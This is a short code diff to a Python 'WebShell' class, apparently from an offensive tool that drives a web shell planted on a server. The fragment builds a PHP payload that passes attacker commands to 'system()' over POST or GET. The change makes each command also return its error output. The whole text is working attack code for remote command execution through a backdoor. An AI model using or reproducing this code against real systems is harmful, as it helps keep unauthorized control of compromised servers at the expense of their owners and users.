@@ -95,10 +95,10 @@ class WebShell():
         tick = random_string(3, string.letters)
         token = random_string(32, string.letters)
         if self.method == "POST":
-            data = {self.password:"echo '"+token+"';system($_POST["+tick+"]);", tick:command}
+            data = {self.password:"echo '"+token+"';system($_POST["+tick+"]);", tick:command + " 2>&1"}
             response = requests.post(self.url, data=data)
         elif self.method == "GET":
-            params = {self.password:"echo '"+token+"';system($_GET["+tick+"]);", tick:command}
+            params = {self.password:"echo '"+token+"';system($_GET["+tick+"]);", tick:command + " 2>&1"}
             response = requests.get(self.url, params=params)
         else:
             return (False, "Unsupported method!")
